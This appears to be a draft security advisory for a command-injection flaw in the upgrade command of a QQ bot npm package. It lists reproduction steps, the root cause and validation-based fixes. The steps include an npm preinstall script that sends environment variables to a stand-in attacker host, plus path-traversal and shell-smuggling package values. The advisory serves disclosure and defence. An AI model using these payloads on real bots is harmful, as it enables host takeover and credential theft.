# Security Advisory: C1 — QQBot fireHotUpgrade Command Injection via `pkg` Parameter

**Advisory ID:** GHSA-placeholder-C1
**CVE ID:** CVE-2026-XXXX (requested)
**Severity:** CRITICAL (CVSS 9.8)
**Affected Package:** `@tencent-connect/openclaw-qqbot`
**Affected Versions:** All versions using `fireHotUpgrade` with `--pkg` parameter
**Patched Versions:** TBD
**Reporter:** Manteclaw (automated MCP security audit)
**Date:** 2026-05-14

---

## Summary

The `/bot-upgrade` slash command in `openclaw-qqbot` accepts a user-controlled `--pkg` parameter that is passed unsanitized into shell arguments for `npm install`. This allows arbitrary command injection via npm lifecycle scripts and path traversal, leading to Remote Code Execution (RCE) on the bot host.

---

## Impact

- **Remote Code Execution** — An attacker with message-send access to the QQ bot can execute arbitrary code on the server hosting the bot.
- **Full Host Compromise** — npm `preinstall`/`postinstall` scripts run with the bot process privileges.
- **Lateral Movement** — In containerized or multi-bot deployments, one compromised bot can attack adjacent services.
- **Data Exfiltration** — Post-install scripts can read environment variables, file system, and network credentials.

---

## Reproduction Steps

### Step 1: Identify a vulnerable bot
Locate an `openclaw-qqbot` instance where the bot operator has enabled the `/bot-upgrade` command.

### Step 2: Send malicious upgrade command
In a QQ group or DM where the bot is present, send:
```
/bot-upgrade --pkg "../../../tmp/evil-pkg" --force
```

### Step 3: Craft the evil package
Create a local directory `../../../tmp/evil-pkg` containing a `package.json` with a malicious lifecycle script:
```json
{
  "name": "evil-pkg",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl -d \"$(env)\" https://attacker.com/exfil || true"
  }
}
```

### Step 4: Observe execution
The bot executes:
```bash
npm install "../../../tmp/evil-pkg"
```
The `preinstall` script runs automatically, exfiltrating environment variables or executing arbitrary commands.

### Alternative: npm registry command injection
```
/bot-upgrade --pkg "evil-pkg; curl attacker.com/exfil || true" --force
```
Depending on shell interpretation, this may also execute arbitrary commands.

---

## Root Cause

**File:** `openclaw-qqbot/src/slash-commands.ts` (lines ~760-860)

```typescript
shellArgs = [
  "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
  "-File", scriptPath,
  "-NoRestart",
  ...(targetVersion ? ["-Version", targetVersion] : []),
  ...(pkg ? ["-Pkg", pkg] : []),  // ← user-controlled, no sanitization
];
```

The `pkg` value is concatenated directly into PowerShell/Bash script arguments. The upgrade script then passes this to `npm install` or `npm update` without validation.

---

## Suggested Fix

### Option A: Strict npm package name validation (Recommended)
Validate `pkg` against the npm package name regex before passing to the shell:

```typescript
const VALID_PKG_REGEX = /^(?:@[a-z0-9-*~][a-z0-9-*._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/;

function isValidNpmPackageName(pkg: string): boolean {
  if (!pkg || pkg.length > 214) return false;
  if (pkg.includes('..') || pkg.includes('/') || pkg.startsWith('.')) return false;
  if (pkg.startsWith('file:') || pkg.startsWith('http:') || pkg.startsWith('https:')) return false;
  return VALID_PKG_REGEX.test(pkg);
}

// In fireHotUpgrade:
if (pkg && !isValidNpmPackageName(pkg)) {
  throw new Error(`Invalid package name: ${pkg}`);
}
```

### Option B: Allowlist-only packages
Only permit upgrade to specific known-good packages (e.g., the bot's own package name). Reject arbitrary user-specified packages entirely.

### Option C: Remove `--pkg` parameter
If the `--pkg` parameter is not strictly necessary, remove it entirely to eliminate the attack surface.

---

## Workaround (for operators)

Until patched, bot operators should:
1. Disable the `/bot-upgrade` command if not needed
2. Run the bot in a restricted container with no network access to internal services
3. Monitor for unexpected npm install processes
4. Set `NODE_ENV=production` to skip dev dependency scripts (partial mitigation)

---

## Timeline

| Date | Action |
|------|--------|
| 2026-05-14 | Vulnerability discovered during automated MCP security audit |
| 2026-05-14 | Advisory drafted, ready for submission |
| TBD | Submitted to GitHub Security Advisories |
| TBD | CVE assigned via MITRE or GitHub |
| TBD | Patch released by maintainers |

---

## References

- npm package name specification: https://docs.npmjs.com/cli/v10/configuring-npm/package-json#name
- CWE-78: OS Command Injection
- CWE-94: Code Injection
- GitHub Security Advisories: https://github.com/advisories

---

*Advisory drafted by Manteclaw — Lane 6 MCP Bug Bounty Scanner*
